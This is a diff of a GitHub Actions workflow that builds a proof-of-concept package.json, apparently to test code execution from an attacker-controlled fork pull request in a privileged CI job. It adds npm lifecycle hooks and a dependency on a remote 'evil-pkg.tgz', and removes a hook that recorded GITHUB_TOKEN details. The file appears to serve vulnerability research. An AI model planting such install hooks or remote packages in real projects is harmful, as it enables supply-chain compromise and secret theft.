@@ -22,8 +22,14 @@ jobs:
             "name": "poc-root",
             "version": "1.0.0",
             "private": true,
+            "dependencies": {
+              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-adobe-lintbot/main/evil-pkg.tgz"
+            },
             "scripts": {
-              "postinstall": "node -e \"const fs=require('fs');fs.writeFileSync('pwned.txt','RCE in privileged workflow\\n'+ 'token_len='+(process.env.GITHUB_TOKEN||'').length + '\\n' + 'repo='+process.env.GITHUB_REPOSITORY+'\\n')\""
+              "preinstall": "node -e \"require('fs').writeFileSync('root-preinstall.txt','ran')\"",
+              "install": "node -e \"require('fs').writeFileSync('root-install.txt','ran')\"",
+              "postinstall": "node -e \"require('fs').writeFileSync('root-postinstall.txt','ran')\"",
+              "prepare": "node -e \"require('fs').writeFileSync('root-prepare.txt','ran')\""
             }
           }
           JSON
@@ -40,5 +46,3 @@ jobs:
             pr-number.txt
             package.json
           if-no-files-found: ignore
-
-# attacker-controlled fork PR version of Lint
